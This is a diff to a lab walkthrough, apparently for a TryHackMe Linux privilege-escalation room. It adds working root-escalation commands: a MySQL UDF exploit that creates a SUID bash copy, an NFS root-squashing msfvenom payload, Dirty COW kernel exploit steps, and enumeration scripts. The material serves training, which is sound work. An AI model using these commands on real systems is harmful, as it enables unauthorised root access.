@@ -48,7 +48,34 @@ ssh user@10.10.42.225
 
 ### Service Exploits
 
+cd /home/user/tools/mysql-udf
+gcc -g -c raptor_udf2.c -fPIC
+gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
+mysql -u root
+use mysql;
+create table foo(line blob);
+insert into foo values(load_file('/home/user/tools/mysql-udf/raptor_udf2.so'));
+select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';
+create function do_system returns integer soname 'raptor_udf2.so';
+select do_system('cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash');
+./rootbash -p
+rm rootbash
+
+
 *Read and follow along with the above.*
+
+![Create Function](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/Service_Exploits_Create_Function.png)
+![Create Table](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/Service_Exploits_Create_Table.png)
+![First Compile](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/Service_Exploits_First_Compile.png)
+![Go Rootbash](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/Service_Exploits_Go_Rootbash.png)
+![Insert Values](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/Service_Exploits_Insert_Values.png)
+![Remove Rootbash](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/Service_Exploits_Remove_Rootbash.png)
+![Root Shell](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/Service_Exploits_Root_Shell.png)
+![Second Compile](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/Service_Exploits_Second_Compile.png)
+![Select](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/Service_Exploits_Select.png)
+![Select Function](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/Service_Exploits_Select_Function.png)
+![Start Mysql](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/Service_Exploits_Start_Mysql.png)
+
 
 ### Weak File Permissions - Readable /etc/shadow
 
@@ -656,6 +683,8 @@ export -f /usr/sbin/service
 
 ### SUID / SGID Executables - Abusing Shell Features (#2)
 
+*Read and follow along with the above.*
+
 ![Bash Debugging](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/Abusing_Shell_Features_2_Bash_Debugging.png)
 ![Root Shell](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/Abusing_Shell_Features_2_Root_Shell.png)
 
@@ -713,6 +742,8 @@ exit
 
 ### Passwords & Keys - SSH Keys
 
+*Read and follow along with the above.*
+
 ![Contents](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/Passwords_SSH_Contents.png)
 ![Create Key](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/Passwords_SSH_Create_Key.png)
 ![Folder](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/Passwords_SSH_Folder.png)
@@ -739,18 +770,41 @@ ssh -i root_key -oPubkeyAcceptedKeyTypes=+ssh-rsa -oHostKeyAlgorithms=+ssh-rsa r
 
 ### NFS
 
+*Read and follow along with the above.*
 
+https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/NFS_Chmod.png
+https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/NFS_Exports.png
+https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/NFS_Mount.png
+https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/NFS_Msfvenom.png
+https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/NFS_Root_Shell.png
+https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/NFS_Root_Tmp.png
+https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/NFS_Tmp_Folder.png
+
+
+```cmd
 cat /etc/exports
+```
+```cmd
 sudo su
+```
+```cmd
 mkdir /tmp/nfs
+```
 
+```cmd
 mount -o rw,vers=3 10.10.197.244:/tmp /tmp/nfs
-
+```
+```cmd
 sudo msfvenom -p linux/x86/exec CMD="/bin/bash -p" -f elf -o /tmp/nfs/shell.elf
 sudo chmod +xs /tmp/nfs/shell.elf
+```
 
+```cmd
 ls -lh /tmp
+```
+```cmd
 /tmp/shell.elf
+```
 
 1. What is the name of the option that disables root squashing?
 
@@ -760,21 +814,50 @@ ls -lh /tmp
 
 ### Kernel Exploits
 
+*Read and follow along with the above.*
 
+![Compile](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/Kernel_Exploits_Compile.png)
+![Dirty Cow](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/Kernel_Exploits_Dirty_Cow.png)
+![Remove](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/Kernel_Exploits_Remove.png)
+![Run Exploit](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/Kernel_Exploits_Run_Exploit.png)
+![Suggester](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/Kernel_Exploits_Suggester.png)
+
+```cmd
 perl /home/user/tools/kernel-exploits/linux-exploit-suggester-2/linux-exploit-suggester-2.pl
+```
 
+```cmd
 gcc -pthread /home/user/tools/kernel-exploits/dirtycow/c0w.c -o c0w
 ./c0w
+```
 
+```cmd
 /usr/bin/passwd
+```
 
+```cmd
 mv /tmp/bak /usr/bin/passwd
 exit
+```
 
 ### Privilege Escalation Scripts 
 
-.cd /home/user/tools/privesc-scripts
+*Read and follow along with the above.*
 
+https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/Priv_Esc_Scripts_LSE.png
+https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/Priv_Esc_Scripts_Lin_Enum.png
+https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/Priv_Esc_Scripts_Linpeas.png
+
+```cmd
+cd /home/user/tools/privesc-scripts
+```
+
+```cmd
 ./LinEnum.sh
+```
+```cmd
 ./linpeas.sh
+```
+```cmd
 ./lse.sh
+```
